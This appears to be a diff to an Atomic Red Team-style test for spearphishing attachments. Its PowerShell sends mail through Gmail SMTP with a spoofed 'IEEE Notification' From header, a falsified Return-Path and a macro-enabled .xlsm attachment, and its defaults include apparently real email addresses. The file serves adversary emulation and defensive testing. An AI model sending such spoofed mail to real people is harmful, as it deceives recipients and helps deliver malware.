@@ -1,10 +1,10 @@
 attack_technique: T1566.001
 display_name: 'Phishing: Spearphishing Attachment'
 atomic_tests:
-  - name: Simulate sending a phishing email with a malicious attachment via SMTP with spoofed headers
+  - name: Simulate sending a phishing email with a malicious attachment via SMTP
     auto_generated_guid: custom-guid-phishing-attachment
     description: |
-      This test simulates sending a phishing email with a malicious attachment by spoofing headers instead of the From field.
+      This test simulates sending a phishing email with a malicious attachment using PowerShell.
       WARNING: THIS IS A SIMULATION AND SHOULD ONLY BE RUN IN A CONTROLLED ENVIRONMENT.
     supported_platforms:
       - windows
@@ -18,17 +18,17 @@ atomic_tests:
         type: integer
         default: 587  # Standard port for Gmail with TLS
       sender_email:
-        description: Real email address for SMTP authentication (Return-Path)
+        description: Real email address for SMTP authentication
         type: string
         default: "chaymaoumayma2003@gmail.com"  # Replace with your Gmail account
       sender_visible_email:
-        description: Email address to spoof in the "From" header
+        description: Email address visible in the "From" field
         type: string
         default: '"IEEE Notification" <chaymabouattour@ieee.org>'  # Spoofed email address
       reply_to_email:
         description: Reply-To email address
         type: string
-        default: "chaymaoumayma2003@gmail.com"  # Reply-to address matching Return-Path
+        default: "chaymaoumayma2003@gmail.com"  # Reply-to address
       return_path:
         description: Return-Path email address for spoofing
         type: string
@@ -51,9 +51,9 @@ atomic_tests:
           Best regards,<br>
           The Security Team
       attachment_path:
-        description: Path to the malicious attachment
+        description: Path to the attachment
         type: string
-        default: "C:\\temp\\PhishingAttachement.xlsm"  # Ensure this matches the actual path
+        default: "C:\\temp\\PhishingAttachment.xlsm"  # Ensure this matches the actual path
       app_password:
         description: Application password for SMTP authentication
         type: string
@@ -68,7 +68,7 @@ atomic_tests:
       command: |
         $smtpServer = "#{smtp_server}"
         $smtpPort = #{smtp_port}
-        $senderEmail = "#{sender_email}"  # Real address for SMTP authentication (Return-Path)
+        $senderEmail = "#{sender_email}"  # Real address for authentication
         $senderVisibleEmail = '#{sender_visible_email}'  # Address visible in the "From" field
         $replyToEmail = "#{reply_to_email}"  # Reply-To email address
         $returnPath = "#{return_path}"  # Falsified Return-Path
@@ -76,42 +76,22 @@ atomic_tests:
         $subject = "#{subject}"
         $body = "#{body}"
         $attachmentPath = "#{attachment_path}"
-        $app_password = "#{app_password}"
-
-        # Create a MailMessage object
-        $mailMessage = New-Object System.Net.Mail.MailMessage
-        $mailMessage.From = New-Object System.Net.Mail.MailAddress($senderEmail)  # Real From address
-        $mailMessage.To.Add($recipientEmail)
-        $mailMessage.Subject = $subject
-        $mailMessage.Body = $body
-        $mailMessage.IsBodyHtml = $true
+        $securePassword = ConvertTo-SecureString "#{app_password}" -AsPlainText -Force
+        $credential = New-Object System.Management.Automation.PSCredential($senderEmail, $securePassword)
 
         # Add custom headers for spoofing
-        $mailMessage.Headers.Add("From", $senderVisibleEmail)  # Spoofed From header
-        $mailMessage.Headers.Add("Reply-To", $replyToEmail)
-        $mailMessage.Headers.Add("Return-Path", "#{return_path}")  # Falsified Return-Path
-        $mailMessage.Headers.Add("X-Priority", "1")
-        $mailMessage.Headers.Add("X-MSMail-Priority", "High")
-        $mailMessage.Headers.Add("Importance", "High")
-
-        # Add attachment
-        if (Test-Path $attachmentPath) {
-            $attachment = New-Object System.Net.Mail.Attachment($attachmentPath)
-            $mailMessage.Attachments.Add($attachment)
-        } else {
-            Write-Host "❌ Attachment file not found: $attachmentPath"
-            exit 1
+        $headers = @{
+            "Reply-To" = "$replyToEmail"
+            "Return-Path" = "$returnPath"
         }
 
-        # Configure SMTP client
-        $smtpClient = New-Object System.Net.Mail.SmtpClient($smtpServer, $smtpPort)
-        $smtpClient.EnableSsl = $true  # Enable SSL for Gmail
-        $securePassword = ConvertTo-SecureString "$app_password" -AsPlainText -Force
-        $smtpClient.Credentials = New-Object System.Management.Automation.PSCredential($senderEmail, $securePassword)
-
-        # Send the email
+        Write-Host "📧 Sending email via SMTP..."
         try {
-            $smtpClient.Send($mailMessage)
+            Send-MailMessage -SmtpServer $smtpServer -Port $smtpPort -UseSsl `
+                -From $senderVisibleEmail -To $recipientEmail `
+                -Subject $subject -BodyAsHtml $body `
+                -Attachments $attachmentPath -Credential $credential `
+                -Headers $headers -ErrorAction Stop
             Write-Host "✅ Email sent successfully."
             
             # Log the result
@@ -120,8 +100,4 @@ atomic_tests:
         } catch {
             Write-Host "❌ Error sending email: $_"
             exit 1
-        } finally {
-            if ($attachment -ne $null) {
-                $attachment.Dispose()
-            }
         }
